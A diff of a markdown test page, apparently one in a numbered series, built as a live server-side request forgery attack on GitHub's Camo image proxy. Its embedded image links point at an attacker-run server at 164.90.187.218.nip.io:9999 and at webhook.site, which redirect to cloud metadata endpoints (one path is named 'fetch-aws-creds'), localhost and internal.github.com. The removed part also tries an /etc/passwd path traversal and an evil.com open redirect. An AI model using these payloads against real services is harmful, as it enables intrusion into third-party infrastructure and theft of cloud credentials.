@@ -1,70 +1,65 @@
-# v48: Response Header & Redirect Chain Analysis
+# v49: 302 Redirect SSRF Attack via Controlled Server
 
-> **KEY FINDING from v47**: nip.io bypass works! Camo fetches from domain-based IPs.
-> Now testing: Do response headers or redirects get passed through?
-
----
-
-## 1. Redirect Chain Tests
-
-### 301 Redirect (webhook.site supports this)
-![301](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-301.gif?redirect=true&status=301&to=https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/final-destination.gif)
-
-### 302 Redirect
-![302](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-302.gif?redirect=true&status=302&to=https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/final-302.gif)
-
-### External redirect to our server
-![ext-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-external.gif?redirect=true&to=http://164.90.187.218.nip.io:8888/from-redirect.gif)
-
-### Redirect to internal
-![int-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-internal.gif?redirect=true&to=http://127.0.0.1:8080/)
-
-### Redirect to localhost
-![local-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-localhost.gif?redirect=true&to=http://localhost/)
-
-### Redirect to 169.254.169.254
-![aws-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-aws.gif?redirect=true&to=http://169.254.169.254/latest/meta-data/)
-
-### Redirect to internal hostname
-![internal-host](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-internal-host.gif?redirect=true&to=http://internal.github.com/)
+> **CRITICAL TEST**: Server at `164.90.187.218.nip.io:9999` returns 302 redirects to internal targets.
+> If Camo follows these redirects → **SSRF VULNERABILITY**!
 
 ---
 
-## 2. Content-Type Confusion
+## 1. Redirect to AWS Metadata (169.254.169.254)
 
-### HTML as image (will Camo serve it?)
-![html](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/html-test.html)
+### AWS Metadata via redirect
+![aws-redir](http://164.90.187.218.nip.io:9999/aws-metadata.gif)
 
-### SVG via Camo
-![svg](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/test.svg)
-
-### JavaScript file (extension)
-![js](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/test.js)
+### AWS with different path
+![aws2](http://164.90.187.218.nip.io:9999/fetch-aws-creds.gif)
 
 ---
 
-## 3. Control Tests
+## 2. Redirect to localhost/127.0.0.1
 
-### Basic control (v48)
-![v48-control](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/v48-control.gif)
+### Localhost redirect
+![local](http://164.90.187.218.nip.io:9999/local-test.gif)
 
-### HTTP control
-![v48-http](http://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/v48-http.gif)
-
----
-
-## 4. Open Redirect via Camo URL?
-
-Camo URLs use format: `https://camo.githubusercontent.com/{hash}/{encoded_url}`
-
-Can we craft a Camo URL that redirects?
-
-### Direct Camo URL with redirect parameter
-![camo-redir](https://camo.githubusercontent.com/redirect?url=http://evil.com)
-
-### Camo URL path traversal attempt
-![camo-traversal](https://camo.githubusercontent.com/../../../etc/passwd)
+### 127.0.0.1 direct
+![127](http://164.90.187.218.nip.io:9999/local-127.gif)
 
 ---
 
-**v48** - Testing redirect behavior and content-type handling
+## 3. Redirect to Internal Hostnames
+
+### internal.github.com
+![github-internal](http://164.90.187.218.nip.io:9999/github-internal.gif)
+
+---
+
+## 4. Redirect to Other Cloud Metadata
+
+### GCP metadata (169.254.169.254 or metadata.google.internal)
+![gcp](http://164.90.187.218.nip.io:9999/aws-gcp.gif)
+
+### Azure metadata (169.254.169.254)
+![azure](http://164.90.187.218.nip.io:9999/aws-azure.gif)
+
+---
+
+## 5. Control Tests
+
+### Redirect to webhook.site (should work)
+![webhook-redir](http://164.90.187.218.nip.io:9999/test-webhook.gif)
+
+### Direct webhook.site control
+![control](https://webhook.site/1873d398-52fb-46cf-b86a-d4aa58c4ad9d/v49-control.gif)
+
+---
+
+## Server Configuration
+
+Server at `164.90.187.218:9999` returns 302 redirects:
+- `/aws*` → `http://169.254.169.254/latest/meta-data/`
+- `/local*` → `http://127.0.0.1/`
+- `/github*` → `http://internal.github.com/`
+- `/*` → `http://webhook.site/redirect-success`
+
+---
+
+**v49** - Testing if Camo follows 302 redirects to internal targets (SSRF)
